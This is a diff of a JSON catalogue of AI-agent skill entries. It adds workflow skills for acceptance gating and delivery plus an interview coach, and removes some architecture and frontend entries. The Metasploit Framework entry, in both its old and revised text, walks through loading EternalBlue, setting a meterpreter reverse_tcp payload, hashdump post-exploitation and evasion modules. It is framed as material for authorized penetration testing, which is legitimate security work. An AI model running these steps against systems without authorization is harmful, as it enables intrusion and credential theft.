@@ -162,6 +162,25 @@
       "scrapedAt": "2026-01-26T13:16:14.583Z"
     },
     {
+      "id": "antigravity-acceptance-orchestrator",
+      "name": "acceptance-orchestrator",
+      "slug": "acceptance-orchestrator",
+      "description": "Use when a coding task should be driven end-to-end from issue intake through implementation, review, deployment, and acceptance verification with minimal human re-intervention.",
+      "category": "AI & Agents",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/acceptance-orchestrator",
+      "content": "\n# Acceptance Orchestrator\n\n## Overview\n\nOrchestrate coding work as a state machine that ends only when acceptance criteria are verified with evidence or the task is explicitly escalated.\n\nCore rule: **do not optimize for \"code changed\"; optimize for \"DoD proven\".**\n\n## Required Sub-Skills\n\n- `create-issue-gate`\n- `closed-loop-delivery`\n- `verification-before-completion`\n\nOptional supporting skills:\n- `deploy-dev`\n- `pr-watch`\n- `pr-review-autopilot`\n- `git-ship`\n\n## Inputs\n\nRequire these inputs:\n- issue id or issue body\n- issue status\n- acceptance criteria (DoD)\n- target environment (`dev` default)\n\nFixed defaults:\n- max iteration rounds = `2`\n- PR review polling = `3m -> 6m -> 10m`\n\n## State Machine\n\n- `intake`\n- `issue-gated`\n- `executing`\n- `review-loop`\n- `deploy-verify`\n- `accepted`\n- `escalated`\n\n## Workflow\n\n1. **Intake**\n   - Read issue and extract task goal + DoD.\n\n2. **Issue gate**\n   - Use `create-issue-gate` logic.\n   - If issue is not `ready` or execution gate is not `allowed`, stop immediately.\n   - Do not implement anything while issue remains `draft`.\n\n3. **Execute**\n   - Hand off to `closed-loop-delivery` for implementation and local verification.\n\n4. **Review loop**\n   - If PR feedback is relevant, batch polling windows as:\n     - wait `3m`\n     - then `6m`\n     - then `10m`\n   - After the `10m` round, stop waiting and process all visible comments together.\n\n5. **Deploy and runtime verification**\n   - If DoD depends on runtime behavior, deploy only to `dev` by default.\n   - Verify with real logs/API/Lambda behavior, not assumptions.\n\n6. **Completion gate**\n   - Before any claim of completion, require `verification-before-completion`.\n   - No success claim without fresh evidence.\n\n## Stop Conditions\n\nMove to `accepted` only when every acceptance criterion has matching evidence.\n\nMove to `escalated` when any of these happen:\n- DoD still fails after `2` full rounds\n- missing secrets/permissions/external dependency blocks progress\n- task needs production action or destructive operation approval\n- review instructions conflict and cannot both be satisfied\n\n## Human Gates\n\nAlways stop for human confirmation on:\n- prod/stage deploys beyond agreed scope\n- destructive git/data operations\n- billing or security posture changes\n- missing user-provided acceptance criteria\n\n## Output Contract\n\nWhen reporting status, always include:\n- `Status`: intake / executing / accepted / escalated\n- `Acceptance Criteria`: pass/fail checklist\n- `Evidence`: commands, logs, API results, or runtime proof\n- `Open Risks`: anything still uncertain\n- `Need Human Input`: smallest next decision, if blocked\n\nDo not report \"done\" unless status is `accepted`.\n",
+      "tags": [
+        "api",
+        "ai",
+        "workflow",
+        "security"
+      ],
+      "useCases": [],
+      "scrapedAt": "2026-03-13T07:03:17.618Z"
+    },
+    {
       "id": "antigravity-accessibility-compliance-accessibility-audit",
       "name": "accessibility-compliance-accessibility-audit",
       "slug": "accessibility-compliance-accessibility-audit",
@@ -7856,6 +7875,32 @@
       "scrapedAt": "2026-02-19T07:10:15.319Z"
     },
     {
+      "id": "antigravity-closed-loop-delivery",
+      "name": "closed-loop-delivery",
+      "slug": "closed-loop-delivery",
+      "description": "Use when a coding task must be completed against explicit acceptance criteria with minimal user re-intervention across implementation, review feedback, deployment, and runtime verification.",
+      "category": "AI & Agents",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/closed-loop-delivery",
+      "content": "\n# Closed-Loop Delivery\n\n## Overview\n\nTreat each task as incomplete until acceptance criteria are verified in evidence, not until code is merely changed.\n\nCore rule: **deliver against DoD (Definition of Done), not against code diff size.**\n\n## When to Use\n\nUse this skill when:\n- user gives a coding/fix task and expects end-to-end completion\n- task spans code + tests + PR comments + dev deploy + runtime checks\n- repeated manual prompts like \"now test\", \"now deploy\", \"now re-check PR\" should be avoided\n\nDo not use this skill for:\n- pure Q&A/explanations\n- prod deploy requests without explicit human approval\n- tasks blocked by missing secrets/account access that cannot be inferred\n\n## Required Inputs\n\nBefore execution, define these once:\n- task goal\n- acceptance criteria (DoD)\n- target environment (`dev` by default)\n- max iteration rounds (default `2`)\n\nIf acceptance criteria are missing, request them once. If user does not provide, propose a concrete default and proceed.\n\n## Issue Gate Dependency\n\nBefore execution, prefer using `create-issue-gate`.\n\n- If issue status is `ready` and execution gate is `allowed`, continue.\n- If issue status is `draft`, do not execute implementation/deploy/review loops.\n- Require user-provided, testable acceptance criteria before starting execution.\n\n## Default Workflow\n\n1. **Define DoD**\n   - Convert request into testable criteria.\n   - Example: checkout task DoD = \"checkout endpoint returns a valid, openable third-party payment URL in dev\".\n\n2. **Implement minimal change**\n   - Keep scope tight to task goal.\n\n3. **Verify locally**\n   - Run focused tests first, then broader checks if needed.\n\n4. **Review loop**\n   - Fetch PR comments/reviews.\n   - Classify valid vs non-actionable.\n   - Fix valid items, re-run verification.\n\n5. **Dev deploy + runtime verification**\n   - Deploy to `dev` when runtime behavior matters.\n   - Verify via real API/Lambda/log evidence against DoD.\n\n6. **Completion decision**\n   - Only report \"done\" when all DoD checks pass.\n   - Otherwise continue loop until pass or stop condition.\n\n## PR Comment Polling Policy\n\nAvoid noisy short polling by default. Use batched windows:\n\n- **Round 1:** wait `3m`, collect delta comments/reviews\n- **Round 2:** wait `6m`, collect delta again\n- **Final round:** wait `10m`, collect all remaining visible comments/reviews\n\nAt each round:\n- process all new comments in one batch\n- avoid immediate re-poll after each single comment\n- after the `10m` round, stop waiting and proceed with all comments visible at that point\n\nIf CI is still running, align polling to check completion boundaries instead of fixed rapid polling.\n\n## Human Gate Rules (Must Ask)\n\nRequire explicit user confirmation for:\n- production/staging deploy beyond agreed scope\n- destructive operations (history rewrite, force push, data-destructive ops)\n- actions with billing/security posture changes\n- secret values not available in repo/runtime\n- ambiguous DoD that materially changes outcome\n\n## Iteration/Stop Conditions\n\nStop and escalate with a concise blocker report when:\n- DoD still fails after max rounds (`2` default)\n- external dependency blocks progress (provider outage, missing creds, account permission)\n- conflicting review instructions cannot both be satisfied\n\nEscalation report must include:\n- what passed\n- what failed\n- evidence (commands/logs/API result)\n- smallest decision needed from user\n\n## Output Contract\n\nWhen claiming completion, always include:\n- acceptance criteria checklist with pass/fail\n- commands/tests run\n- runtime evidence (endpoint/Lambda/log key lines)\n- PR status (new actionable comments count)\n\nDo not claim success without evidence.\n",
+      "tags": [
+        "api",
+        "ai",
+        "workflow",
+        "security",
+        "cro"
+      ],
+      "useCases": [
+        "user gives a coding/fix task and expects end-to-end completion",
+        "task spans code + tests + PR comments + dev deploy + runtime checks",
+        "repeated manual prompts like \"now test\", \"now deploy\", \"now re-check PR\" should be avoided",
+        "pure Q&A/explanations",
+        "prod deploy requests without explicit human approval"
+      ],
+      "scrapedAt": "2026-03-13T07:05:19.093Z"
+    },
+    {
       "id": "antigravity-cloud-architect",
       "name": "cloud-architect",
       "slug": "cloud-architect",
@@ -9554,6 +9599,24 @@
       ],
       "useCases": [],
       "scrapedAt": "2026-03-07T06:53:53.985Z"
+    },
+    {
+      "id": "antigravity-create-issue-gate",
+      "name": "create-issue-gate",
+      "slug": "create-issue-gate",
+      "description": "Use when starting a new implementation task and an issue must be created with strict acceptance criteria gating before execution.",
+      "category": "AI & Agents",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/create-issue-gate",
+      "content": "\n# Create Issue Gate\n\n## Overview\n\nCreate GitHub issues as the single tracking entrypoint for tasks, with a hard gate on acceptance criteria.\n\nCore rule: **no explicit, testable acceptance criteria from user => issue stays `draft` and execution is blocked.**\n\n## Required Fields\n\nEvery issue must include these sections:\n- Problem\n- Goal\n- Scope\n- Non-Goals\n- Acceptance Criteria\n- Dependencies/Blockers\n- Status (`draft` | `ready` | `blocked` | `done`)\n\n## Acceptance Criteria Gate\n\nAcceptance criteria are valid only when they are testable and pass/fail checkable.\n\nExamples:\n- valid: \"CreateCheckoutLambda-dev returns an openable third-party payment checkout URL\"\n- invalid: \"fix checkout\" / \"improve UX\" / \"make it better\"\n\nIf criteria are missing or non-testable:\n- still create the issue\n- set `Status: draft`\n- add `Execution Gate: blocked (missing valid acceptance criteria)`\n- do not move task to execution\n\n## Issue Creation Mode\n\nDefault mode is direct GitHub creation using `gh issue create`.\n\nUse a body template like:\n\n```md\n## Problem\n<what is broken or missing>\n\n## Goal\n<what outcome is expected>\n\n## Scope\n- <in scope item>\n\n## Non-Goals\n- <out of scope item>\n\n## Acceptance Criteria\n- <explicit, testable criterion 1>\n\n## Dependencies/Blockers\n- <dependency or none>\n\n## Status\ndraft|ready|blocked|done\n\n## Execution Gate\nallowed|blocked (<reason>)\n```\n\n## Status Rules\n\n- `draft`: missing/weak acceptance criteria or incomplete task definition\n- `ready`: acceptance criteria are explicit and testable\n- `blocked`: external dependency prevents progress\n- `done`: acceptance criteria verified with evidence\n\nNever mark an issue `ready` without valid acceptance criteria.\n\n## Handoff to Execution\n\nExecution workflows (for example `closed-loop-delivery`) may start only when:\n- issue status is `ready`\n- execution gate is `allowed`\n\nIf issue is `draft`, stop and request user-provided acceptance criteria.\n",
+      "tags": [
+        "ai",
+        "workflow",
+        "template"
+      ],
+      "useCases": [],
+      "scrapedAt": "2026-03-13T07:05:46.548Z"
     },
     {
       "id": "antigravity-create-pr",
@@ -16437,6 +16500,32 @@
       "scrapedAt": "2026-01-26T13:19:07.404Z"
     },
     {
+      "id": "antigravity-interview-coach",
+      "name": "interview-coach",
+      "slug": "interview-coach",
+      "description": "Full job search coaching system — JD decoding, resume, storybank, mock interviews, transcript analysis, comp negotiation. 23 commands, persistent state.",
+      "category": "AI & Agents",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/interview-coach",
+      "content": "\n# Interview Coach\n\n## Overview\n\nA persistent, adaptive coaching system for the full job search lifecycle.\nNot a question bank — an opinionated system that tracks your patterns,\nscores your answers, and gets sharper the more you use it. State persists\nin `coaching_state.md` across sessions so you always pick up where you left off.\n\n## Install\n\n```bash\nnpx skills add dbhat93/job-search-os\n```\n\nThen type `/coach` → `kickoff`.\n\n## When to Use This Skill\n\n- Use when starting a job search and need a structured system\n- Use when preparing for a specific interview (company research, mock, hype)\n- Use when you want to analyze a past interview transcript\n- Use when negotiating an offer or handling comp questions on recruiter screens\n- Use when building or maintaining a storybank of interview-ready stories\n\n## What It Covers\n\n- **JD decoding** — six lenses, fit verdict, recruiter questions to ask\n- **Resume + LinkedIn** — ATS audit, bullet rewrites, platform-native optimization\n- **Mock interviews** — behavioral, system design, case, panel, technical formats\n- **Transcript analysis** — paste from Otter/Zoom/Grain, auto-detected format\n- **Storybank** — STAR stories with earned secrets, retrieval drills, portfolio optimization\n- **Comp + negotiation** — pre-offer scripting, offer analysis, exact negotiation scripts\n- **23 total commands** across the full search lifecycle\n\n## Examples\n\n### Example 1: Start your job search\n\n```\n/coach\nkickoff\n```\n\nThe coach asks for your resume, target role, and timeline — then builds\nyour profile and gives you a prioritized action plan.\n\n### Example 2: Prep for a specific company\n\n```\n/coach\nprep Stripe Senior PM\n```\n\nRuns company research, generates a role-specific prep brief, and queues\nup mock interview questions tailored to Stripe's process.\n\n### Example 3: Analyze an interview transcript\n\n```\n/coach\nanalyze\n```\n\nPaste a raw transcript from Otter, Zoom, or any tool. The coach\nauto-detects the format, scores each answer across five dimensions,\nand gives you a drill plan targeting your specific gaps.\n\n### Example 4: Handle a comp question\n\n```\n/coach\nsalary\n```\n\nCoaches you through the recruiter screen \"what are your salary\nexpectations?\" moment with a defensible range and exact scripts.\n\n## Source\n\nhttps://github.com/dbhat93/job-search-os\n",
+      "tags": [
+        "claude",
+        "ai",
+        "design",
+        "stripe",
+        "cro"
+      ],
+      "useCases": [
+        "Use when starting a job search and need a structured system",
+        "Use when preparing for a specific interview (company research, mock, hype)",
+        "Use when you want to analyze a past interview transcript",
+        "Use when negotiating an offer or handling comp questions on recruiter screens",
+        "Use when building or maintaining a storybank of interview-ready stories"
+      ],
+      "scrapedAt": "2026-03-13T07:07:47.421Z"
+    },
+    {
       "id": "antigravity-inventory-demand-planning",
       "name": "inventory-demand-planning",
       "slug": "inventory-demand-planning",
@@ -18934,7 +19023,7 @@
       "source": "antigravity",
       "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
       "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/metasploit-framework",
-      "content": "\n# Metasploit Framework\n\n## Purpose\n\nLeverage the Metasploit Framework for comprehensive penetration testing, from initial exploitation through post-exploitation activities. Metasploit provides a unified platform for vulnerability exploitation, payload generation, auxiliary scanning, and maintaining access to compromised systems during authorized security assessments.\n\n## Prerequisites\n\n### Required Tools\n```bash\n# Metasploit comes pre-installed on Kali Linux\n# For other systems:\ncurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall\nchmod 755 msfinstall\n./msfinstall\n\n# Start PostgreSQL for database support\nsudo systemctl start postgresql\nsudo msfdb init\n```\n\n### Required Knowledge\n- Network and system fundamentals\n- Understanding of vulnerabilities and exploits\n- Basic programming concepts\n- Target enumeration techniques\n\n### Required Access\n- Written authorization for testing\n- Network access to target systems\n- Understanding of scope and rules of engagement\n\n## Outputs and Deliverables\n\n1. **Exploitation Evidence** - Screenshots and logs of successful compromises\n2. **Session Logs** - Command history and extracted data\n3. **Vulnerability Mapping** - Exploited vulnerabilities with CVE references\n4. **Post-Exploitation Artifacts** - Credentials, files, and system information\n\n## Core Workflow\n\n### Phase 1: MSFConsole Basics\n\nLaunch and navigate the Metasploit console:\n\n```bash\n# Start msfconsole\nmsfconsole\n\n# Quiet mode (skip banner)\nmsfconsole -q\n\n# Basic navigation commands\nmsf6 > help                    # Show all commands\nmsf6 > search [term]           # Search modules\nmsf6 > use [module]            # Select module\nmsf6 > info                    # Show module details\nmsf6 > show options            # Display required options\nmsf6 > set [OPTION] [value]    # Configure option\nmsf6 > run / exploit           # Execute module\nmsf6 > back                    # Return to main console\nmsf6 > exit                    # Exit msfconsole\n```\n\n### Phase 2: Module Types\n\nUnderstand the different module categories:\n\n```bash\n# 1. Exploit Modules - Target specific vulnerabilities\nmsf6 > show exploits\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\n\n# 2. Payload Modules - Code executed after exploitation\nmsf6 > show payloads\nmsf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp\n\n# 3. Auxiliary Modules - Scanning, fuzzing, enumeration\nmsf6 > show auxiliary\nmsf6 > use auxiliary/scanner/smb/smb_version\n\n# 4. Post-Exploitation Modules - Actions after compromise\nmsf6 > show post\nmsf6 > use post/windows/gather/hashdump\n\n# 5. Encoders - Obfuscate payloads\nmsf6 > show encoders\nmsf6 > set ENCODER x86/shikata_ga_nai\n\n# 6. Nops - No-operation padding for buffer overflows\nmsf6 > show nops\n\n# 7. Evasion - Bypass security controls\nmsf6 > show evasion\n```\n\n### Phase 3: Searching for Modules\n\nFind appropriate modules for targets:\n\n```bash\n# Search by name\nmsf6 > search eternalblue\n\n# Search by CVE\nmsf6 > search cve:2017-0144\n\n# Search by platform\nmsf6 > search platform:windows type:exploit\n\n# Search by type and keyword\nmsf6 > search type:auxiliary smb\n\n# Filter by rank (excellent, great, good, normal, average, low, manual)\nmsf6 > search rank:excellent\n\n# Combined search\nmsf6 > search type:exploit platform:linux apache\n\n# View search results columns:\n# Name, Disclosure Date, Rank, Check (if it can verify vulnerability), Description\n```\n\n### Phase 4: Configuring Exploits\n\nSet up an exploit for execution:\n\n```bash\n# Select exploit module\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\n\n# View required options\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > show options\n\n# Set target host\nmsf6 exploit(...) > set RHOSTS 192.168.1.100\n\n# Set target port (if different from default)\nmsf6 exploit(...) > set RPORT 445\n\n# View compatible payloads\nmsf6 exploit(...) > show payloads\n\n# Set payload\nmsf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp\n\n# Set local host for reverse connection\nmsf6 exploit(...) > set LHOST 192.168.1.50\nmsf6 exploit(...) > set LPORT 4444\n\n# View all options again to verify\nmsf6 exploit(...) > show options\n\n# Check if target is vulnerable (if supported)\nmsf6 exploit(...) > check\n\n# Execute exploit\nmsf6 exploit(...) > exploit\n# or\nmsf6 exploit(...) > run\n```\n\n### Phase 5: Payload Types\n\nSelect appropriate payload for the situation:\n\n```bash\n# Singles - Self-contained, no staging\nwindows/shell_reverse_tcp\nlinux/x86/shell_bind_tcp\n\n# Stagers - Small payload that downloads larger stage\nwindows/meterpreter/reverse_tcp\nlinux/x86/meterpreter/bind_tcp\n\n# Stages - Downloaded by stager, provides full functionality\n# Meterpreter, VNC, shell\n\n# Payload naming convention:\n# [platform]/[architecture]/[payload_type]/[connection_type]\n# Examples:\nwindows/x64/meterpreter/reverse_tcp\nlinux/x86/shell/bind_tcp\nphp/meterpreter/reverse_tcp\njava/meterpreter/reverse_https\nandroid/meterpreter/reverse_tcp\n```\n\n### Phase 6: Meterpreter S",
+      "content": "\n# Metasploit Framework\n\n> **⚠️ AUTHORIZED USE ONLY**\n> This skill is for educational purposes or authorized security assessments only.\n> You must have explicit, written permission from the system owner before using this tool.\n> Misuse of this tool is illegal and strictly prohibited.\n\n## Purpose\n\nLeverage the Metasploit Framework for comprehensive penetration testing, from initial exploitation through post-exploitation activities. Metasploit provides a unified platform for vulnerability exploitation, payload generation, auxiliary scanning, and maintaining access to compromised systems during authorized security assessments.\n\n## Prerequisites\n\n### Required Tools\n```bash\n# Metasploit must already be installed before using this skill.\n# Kali Linux usually ships with it preinstalled.\nmsfconsole --version\n```\n\nInstallation varies by operating system and package source. Follow your platform's documented package-manager or vendor installation process before using this skill. Do not rely on an unpinned remote installer script from inside this skill.\n\nIf you want database-backed features such as workspace tracking, initialize `msfdb` using the instructions for your local installation. This skill assumes Metasploit is already available and does not require `sudo`, `systemctl`, or other privileged host-level setup steps.\n\n### Required Knowledge\n- Network and system fundamentals\n- Understanding of vulnerabilities and exploits\n- Basic programming concepts\n- Target enumeration techniques\n\n### Required Access\n- Written authorization for testing\n- Network access to target systems\n- Understanding of scope and rules of engagement\n\nBefore running exploit modules, ask the user to confirm the exact target host, scope, and authorization state.\n\n## Outputs and Deliverables\n\n1. **Exploitation Evidence** - Screenshots and logs of successful compromises\n2. **Session Logs** - Command history and extracted data\n3. **Vulnerability Mapping** - Exploited vulnerabilities with CVE references\n4. **Post-Exploitation Artifacts** - Credentials, files, and system information\n\n## Core Workflow\n\n### Phase 1: MSFConsole Basics\n\nLaunch and navigate the Metasploit console:\n\n```bash\n# Start msfconsole\nmsfconsole\n\n# Quiet mode (skip banner)\nmsfconsole -q\n\n# Basic navigation commands\nmsf6 > help                    # Show all commands\nmsf6 > search [term]           # Search modules\nmsf6 > use [module]            # Select module\nmsf6 > info                    # Show module details\nmsf6 > show options            # Display required options\nmsf6 > set [OPTION] [value]    # Configure option\nmsf6 > run / exploit           # Execute module\nmsf6 > back                    # Return to main console\nmsf6 > exit                    # Exit msfconsole\n```\n\n### Phase 2: Module Types\n\nUnderstand the different module categories:\n\n```bash\n# 1. Exploit Modules - Target specific vulnerabilities\nmsf6 > show exploits\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\n\n# 2. Payload Modules - Code executed after exploitation\nmsf6 > show payloads\nmsf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp\n\n# 3. Auxiliary Modules - Scanning, fuzzing, enumeration\nmsf6 > show auxiliary\nmsf6 > use auxiliary/scanner/smb/smb_version\n\n# 4. Post-Exploitation Modules - Actions after compromise\nmsf6 > show post\nmsf6 > use post/windows/gather/hashdump\n\n# 5. Encoders - Obfuscate payloads\nmsf6 > show encoders\nmsf6 > set ENCODER x86/shikata_ga_nai\n\n# 6. Nops - No-operation padding for buffer overflows\nmsf6 > show nops\n\n# 7. Evasion - Bypass security controls\nmsf6 > show evasion\n```\n\n### Phase 3: Searching for Modules\n\nFind appropriate modules for targets:\n\n```bash\n# Search by name\nmsf6 > search eternalblue\n\n# Search by CVE\nmsf6 > search cve:2017-0144\n\n# Search by platform\nmsf6 > search platform:windows type:exploit\n\n# Search by type and keyword\nmsf6 > search type:auxiliary smb\n\n# Filter by rank (excellent, great, good, normal, average, low, manual)\nmsf6 > search rank:excellent\n\n# Combined search\nmsf6 > search type:exploit platform:linux apache\n\n# View search results columns:\n# Name, Disclosure Date, Rank, Check (if it can verify vulnerability), Description\n```\n\n### Phase 4: Configuring Exploits\n\nSet up an exploit for execution:\n\n```bash\n# Select exploit module\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\n\n# View required options\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > show options\n\n# Set target host\nmsf6 exploit(...) > set RHOSTS 192.168.1.100\n\n# Set target port (if different from default)\nmsf6 exploit(...) > set RPORT 445\n\n# View compatible payloads\nmsf6 exploit(...) > show payloads\n\n# Set payload\nmsf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp\n\n# Set local host for reverse connection\nmsf6 exploit(...) > set LHOST 192.168.1.50\nmsf6 exploit(...) > set LPORT 4444\n\n# View all options again to verify\nmsf6 exploit(...) > show options\n\n# Check if target is vulnerable (if supported)\nmsf6 exploit(...) > check\n\n# Execute exploit\nmsf6 exploit(...) > exploit\n# or\nmsf6 exp",
       "tags": [
         "python",
         "api",
@@ -24973,108 +25062,6 @@
       "scrapedAt": "2026-03-09T07:16:01.874Z"
     },
     {
-      "id": "antigravity-senior-architect",
-      "name": "senior-architect",
-      "slug": "senior-architect",
-      "description": "Comprehensive software architecture skill for designing scalable, maintainable systems using ReactJS, NextJS, NodeJS, Express, React Native, Swift, Kotlin, Flutter, Postgres, GraphQL, Go, Python. I...",
-      "category": "Document Processing",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/senior-architect",
-      "content": "\n# Senior Architect\n\nComplete toolkit for senior architect with modern tools and best practices.\n\n## Quick Start\n\n### Main Capabilities\n\nThis skill provides three core capabilities through automated scripts:\n\n```bash\n# Script 1: Architecture Diagram Generator\npython scripts/architecture_diagram_generator.py [options]\n\n# Script 2: Project Architect\npython scripts/project_architect.py [options]\n\n# Script 3: Dependency Analyzer\npython scripts/dependency_analyzer.py [options]\n```\n\n## Core Capabilities\n\n### 1. Architecture Diagram Generator\n\nAutomated tool for architecture diagram generator tasks.\n\n**Features:**\n- Automated scaffolding\n- Best practices built-in\n- Configurable templates\n- Quality checks\n\n**Usage:**\n```bash\npython scripts/architecture_diagram_generator.py <project-path> [options]\n```\n\n### 2. Project Architect\n\nComprehensive analysis and optimization tool.\n\n**Features:**\n- Deep analysis\n- Performance metrics\n- Recommendations\n- Automated fixes\n\n**Usage:**\n```bash\npython scripts/project_architect.py <target-path> [--verbose]\n```\n\n### 3. Dependency Analyzer\n\nAdvanced tooling for specialized tasks.\n\n**Features:**\n- Expert-level automation\n- Custom configurations\n- Integration ready\n- Production-grade output\n\n**Usage:**\n```bash\npython scripts/dependency_analyzer.py [arguments] [options]\n```\n\n## Reference Documentation\n\n### Architecture Patterns\n\nComprehensive guide available in `references/architecture_patterns.md`:\n\n- Detailed patterns and practices\n- Code examples\n- Best practices\n- Anti-patterns to avoid\n- Real-world scenarios\n\n### System Design Workflows\n\nComplete workflow documentation in `references/system_design_workflows.md`:\n\n- Step-by-step processes\n- Optimization strategies\n- Tool integrations\n- Performance tuning\n- Troubleshooting guide\n\n### Tech Decision Guide\n\nTechnical reference guide in `references/tech_decision_guide.md`:\n\n- Technology stack details\n- Configuration examples\n- Integration patterns\n- Security considerations\n- Scalability guidelines\n\n## Tech Stack\n\n**Languages:** TypeScript, JavaScript, Python, Go, Swift, Kotlin\n**Frontend:** React, Next.js, React Native, Flutter\n**Backend:** Node.js, Express, GraphQL, REST APIs\n**Database:** PostgreSQL, Prisma, NeonDB, Supabase\n**DevOps:** Docker, Kubernetes, Terraform, GitHub Actions, CircleCI\n**Cloud:** AWS, GCP, Azure\n\n## Development Workflow\n\n### 1. Setup and Configuration\n\n```bash\n# Install dependencies\nnpm install\n# or\npip install -r requirements.txt\n\n# Configure environment\ncp .env.example .env\n```\n\n### 2. Run Quality Checks\n\n```bash\n# Use the analyzer script\npython scripts/project_architect.py .\n\n# Review recommendations\n# Apply fixes\n```\n\n### 3. Implement Best Practices\n\nFollow the patterns and practices documented in:\n- `references/architecture_patterns.md`\n- `references/system_design_workflows.md`\n- `references/tech_decision_guide.md`\n\n## Best Practices Summary\n\n### Code Quality\n- Follow established patterns\n- Write comprehensive tests\n- Document decisions\n- Review regularly\n\n### Performance\n- Measure before optimizing\n- Use appropriate caching\n- Optimize critical paths\n- Monitor in production\n\n### Security\n- Validate all inputs\n- Use parameterized queries\n- Implement proper authentication\n- Keep dependencies updated\n\n### Maintainability\n- Write clear code\n- Use consistent naming\n- Add helpful comments\n- Keep it simple\n\n## Common Commands\n\n```bash\n# Development\nnpm run dev\nnpm run build\nnpm run test\nnpm run lint\n\n# Analysis\npython scripts/project_architect.py .\npython scripts/dependency_analyzer.py --analyze\n\n# Deployment\ndocker build -t app:latest .\ndocker-compose up -d\nkubectl apply -f k8s/\n```\n\n## Troubleshooting\n\n### Common Issues\n\nCheck the comprehensive troubleshooting section in `references/tech_decision_guide.md`.\n\n### Getting Help\n\n- Review reference documentation\n- Check script output messages\n- Consult tech stack documentation\n- Review error logs\n\n## Resources\n\n- Pattern Reference: `references/architecture_patterns.md`\n- Workflow Guide: `references/system_design_workflows.md`\n- Technical Guide: `references/tech_decision_guide.md`\n- Tool Scripts: `scripts/` directory\n\n## When to Use\nThis skill is applicable to execute the workflow or actions described in the overview.\n",
-      "tags": [
-        "python",
-        "javascript",
-        "typescript",
-        "react",
-        "node",
-        "nextjs",
-        "api",
-        "ai",
-        "automation",
-        "workflow"
-      ],
-      "useCases": [],
-      "scrapedAt": "2026-03-09T07:16:02.153Z"
-    },
-    {
-      "id": "antigravity-senior-frontend",
-      "name": "senior-frontend",
-      "slug": "senior-frontend",
-      "description": "Frontend development skill for React, Next.js, TypeScript, and Tailwind CSS applications. Use when building React components, optimizing Next.js performance, analyzing bundle sizes, scaffolding frontend projects, implementing accessibility, or reviewing frontend code quality.",
-      "category": "Document Processing",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/senior-frontend",
-      "content": "\n# Senior Frontend\n\nFrontend development patterns, performance optimization, and automation tools for React/Next.js applications.\n\n## When to Use\n\n- Use when scaffolding a new React or Next.js project with TypeScript and Tailwind CSS.\n- Use when generating new components or custom hooks.\n- Use when analyzing and optimizing bundle sizes for frontend applications.\n- Use to implement or review advanced React patterns like Compound Components or Render Props.\n- Use to ensure accessibility compliance and implement robust testing strategies.\n\n## Table of Contents\n\n- [Project Scaffolding](#project-scaffolding)\n- [Component Generation](#component-generation)\n- [Bundle Analysis](#bundle-analysis)\n- [React Patterns](#react-patterns)\n- [Next.js Optimization](#nextjs-optimization)\n- [Accessibility and Testing](#accessibility-and-testing)\n\n---\n\n## Project Scaffolding\n\nGenerate a new Next.js or React project with TypeScript, Tailwind CSS, and best practice configurations.\n\n### Workflow: Create New Frontend Project\n\n1. Run the scaffolder with your project name and template:\n\n   ```bash\n   python scripts/frontend_scaffolder.py my-app --template nextjs\n   ```\n\n2. Add optional features (auth, api, forms, testing, storybook):\n\n   ```bash\n   python scripts/frontend_scaffolder.py dashboard --template nextjs --features auth,api\n   ```\n\n3. Navigate to the project and install dependencies:\n\n   ```bash\n   cd my-app && npm install\n   ```\n\n4. Start the development server:\n   ```bash\n   npm run dev\n   ```\n\n### Scaffolder Options\n\n| Option               | Description                                       |\n| -------------------- | ------------------------------------------------- |\n| `--template nextjs`  | Next.js 14+ with App Router and Server Components |\n| `--template react`   | React + Vite with TypeScript                      |\n| `--features auth`    | Add NextAuth.js authentication                    |\n| `--features api`     | Add React Query + API client                      |\n| `--features forms`   | Add React Hook Form + Zod validation              |\n| `--features testing` | Add Vitest + Testing Library                      |\n| `--dry-run`          | Preview files without creating them               |\n\n### Generated Structure (Next.js)\n\n```\nmy-app/\n├── app/\n│   ├── layout.tsx        # Root layout with fonts\n│   ├── page.tsx          # Home page\n│   ├── globals.css       # Tailwind + CSS variables\n│   └── api/health/route.ts\n├── components/\n│   ├── ui/               # Button, Input, Card\n│   └── layout/           # Header, Footer, Sidebar\n├── hooks/                # useDebounce, useLocalStorage\n├── lib/                  # utils (cn), constants\n├── types/                # TypeScript interfaces\n├── tailwind.config.ts\n├── next.config.js\n└── package.json\n```\n\n---\n\n## Component Generation\n\nGenerate React components with TypeScript, tests, and Storybook stories.\n\n### Workflow: Create a New Component\n\n1. Generate a client component:\n\n   ```bash\n   python scripts/component_generator.py Button --dir src/components/ui\n   ```\n\n2. Generate a server component:\n\n   ```bash\n   python scripts/component_generator.py ProductCard --type server\n   ```\n\n3. Generate with test and story files:\n\n   ```bash\n   python scripts/component_generator.py UserProfile --with-test --with-story\n   ```\n\n4. Generate a custom hook:\n   